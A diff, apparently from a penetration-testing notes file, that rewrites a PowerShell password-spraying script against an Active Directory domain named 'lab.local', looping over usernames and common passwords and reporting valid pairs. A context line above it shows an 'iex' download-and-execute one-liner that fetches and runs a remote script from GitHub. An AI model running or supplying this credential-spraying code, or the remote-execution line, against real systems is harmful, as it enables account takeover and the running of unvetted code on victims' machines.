@@ -615,19 +615,29 @@ iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 
 ```
-$UserList = @("user1","user2","user3")
-$PasswordList = @("Password123","Summer2025!","Welcome1")
+# Domain info
+$Domain = "lab.local"
 
-foreach ($user in $UserList){
-    foreach ($pass in $PasswordList){
+# Users and passwords
+$UserList = @("user1","user2")
+$PasswordList = @("Password123","Summer2025!")
+
+foreach ($user in $UserList) {
+    foreach ($pass in $PasswordList) {
         try {
-            $cred = New-Object System.Management.Automation.PSCredential($user,(ConvertTo-SecureString $pass -AsPlainText -Force))
-            $result = Test-ADCredential -Credential $cred
-            if ($result){
-                Write-Output "Success: $user : $pass"
+            # Create PrincipalContext with explicit domain
+            $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $Domain)
+
+            # Validate credentials (plain text password)
+            $valid = $pc.ValidateCredentials($user, $pass, [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate)
+
+            if ($valid) {
+                Write-Output "SUCCESS: $user : $pass"
+            } else {
+                Write-Output "FAILED: $user : $pass"
             }
         } catch {
-            Write-Output "Failed: $user : $pass"
+            Write-Output "ERROR: $user : $pass -> $_"
         }
     }
 }
